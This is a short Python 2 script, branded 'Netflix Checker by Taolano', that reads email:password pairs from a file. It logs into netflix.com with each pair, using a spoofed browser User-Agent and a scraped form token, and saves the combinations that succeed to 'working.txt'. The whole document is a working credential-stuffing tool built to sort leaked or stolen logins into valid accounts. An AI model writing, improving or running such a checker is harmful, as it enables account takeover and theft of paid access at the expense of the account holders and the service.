#!/usr/bin/env python
# coding=utf-8

archivo = "credenciales.txt"
print "--------------------------[Netflix Checker by Taolano]--------------------------"
try:
	outfile = open('working.txt', 'w')
	workingList = []
	try:
		import requests
		import sys, os
		import os.path
		from BeautifulSoup import BeautifulSoup as Soup
	except ImportError:
		print "Needed dependencies: 'requests', 'BeautifulSoup'"

	def checkPassword(email,password):
		s = requests.Session()
		s.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0'})
		login = s.get("https://www.netflix.com/ar-en/Login")
		soup=Soup(login.text)
		authURL = soup.findAll('form')[0]('input')[-2]['value']
		r2 = s.post("https://www.netflix.com:443/Login", headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.netflix.com/Login", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}, data={"email": (email), "password": (password), "rememberMeCheckbox": "true", "flow": "websiteSignUp", "mode": "login", "action": "loginAction", "withFields": "email,password,rememberMe,nextPage", "authURL": (authURL), "nextPage": "https://www.netflix.com/browse"})
		r1 = s.get("https://www.netflix.com/browse")
		print "Testing: " + email
		validado = r1.text.find('Please enter a valid email')
		if validado == -1:
			print"State: WORKING !","Email: "+email+" Password: "+password + "\n"
			workingList.append(email +':'+ password) 

		else:
			print"State: not working" + "\n"

	def checkFile(archivo):
		try:
			fichero = open(archivo) 
			fichero.close()  
		except: 
			print "Be sure that credenciales.txt is write like this: email:password"
	lectura = open(archivo, "r")
	lineas = list(archivo)
	checkFile(archivo)
	for lineas in lectura:
		email=lineas.split(":")[0]
		password=lineas.split(":")[1]
		checkPassword(email,password)
except KeyboardInterrupt:
   	 for all in workingList:
		outfile.write(all)
    	 sys.exit()
	 outfile.close()
